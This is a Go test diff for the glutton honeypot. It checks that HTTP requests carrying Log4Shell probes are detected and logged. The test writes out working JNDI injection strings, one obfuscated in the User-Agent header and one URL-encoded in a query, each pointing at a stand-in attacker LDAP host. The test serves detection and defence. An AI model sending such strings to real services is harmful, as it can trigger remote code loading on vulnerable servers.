@@ -13,6 +13,7 @@ import (
 
 	"github.com/mushorg/glutton/connection"
 	"github.com/mushorg/glutton/protocols/tcp/citrix"
+	"github.com/mushorg/glutton/protocols/tcp/log4shell"
 	"github.com/mushorg/glutton/protocols/tcp/pve"
 	"github.com/stretchr/testify/require"
 )
@@ -636,4 +637,67 @@ func TestHandleHTTPNonCitrixPathUntagged(t *testing.T) {
 	events := waitProduced(t, hp).decoded.([]parsedHTTP)
 	require.Len(t, events, 2)
 	require.Nil(t, events[0].Citrix)
+}
+
+// Synthetic Log4Shell probes modeled on public scanners: an obfuscated
+// User-Agent lookup, a URL-encoded query lookup, and a clean request.
+func TestHandleHTTPLog4Shell(t *testing.T) {
+	withHTTPSessionIdle(t, 50*time.Millisecond)
+
+	client, serverConn := net.Pipe()
+	defer client.Close()
+
+	hp := newFakeHoneypot()
+	done := make(chan error, 1)
+	go func() {
+		done <- HandleHTTP(context.Background(), serverConn, connection.Metadata{TargetPort: 8080}, &recordingLogger{}, hp)
+	}()
+	require.NoError(t, client.SetDeadline(time.Now().Add(2*time.Second)))
+
+	ua := httpTestRequest("GET", "/", "", nil)
+	ua = bytes.Replace(ua, []byte("test-agent/1.0"), []byte("${${lower:j}ndi:ldap://203.0.113.9:1389/a}"), 1)
+	reqs := [][]byte{
+		ua,
+		httpTestRequest("GET", "/?x=%24%7Bjndi:ldap://203.0.113.9/q%7D", "", nil),
+		httpTestRequest("GET", "/", "", nil),
+	}
+	for _, r := range reqs {
+		_, err := client.Write(r)
+		require.NoError(t, err)
+		status, _, body := readHTTPResponse(t, client)
+		require.Equal(t, http.StatusOK, status)
+		require.Empty(t, body)
+	}
+	require.NoError(t, client.Close())
+	select {
+	case err := <-done:
+		require.NoError(t, err)
+	case <-time.After(2 * time.Second):
+		t.Fatal("handler did not finish")
+	}
+
+	produced := waitProduced(t, hp)
+	require.Equal(t, "http", produced.protocol)
+	select {
+	case extra := <-hp.produced:
+		t.Fatalf("expected a single produced event, got another: %+v", extra)
+	default:
+	}
+	events := produced.decoded.([]parsedHTTP)
+	require.Len(t, events, 6)
+
+	require.Equal(t, &log4shell.Request{Lookups: []log4shell.Lookup{{
+		Location: "header:User-Agent",
+		Raw:      "${${lower:j}ndi:ldap://203.0.113.9:1389/a}",
+		Resolved: "jndi:ldap://203.0.113.9:1389/a",
+	}}}, events[0].Log4Shell)
+	require.Equal(t, ua, events[0].Payload)
+	require.NotNil(t, events[2].Log4Shell)
+	require.Equal(t, "query", events[2].Log4Shell.Lookups[0].Location)
+	require.Nil(t, events[4].Log4Shell)
+	for _, i := range []int{1, 3, 5} {
+		require.Equal(t, "write", events[i].Direction)
+		require.Equal(t, "200", events[i].Status)
+		require.Nil(t, events[i].Log4Shell)
+	}
 }
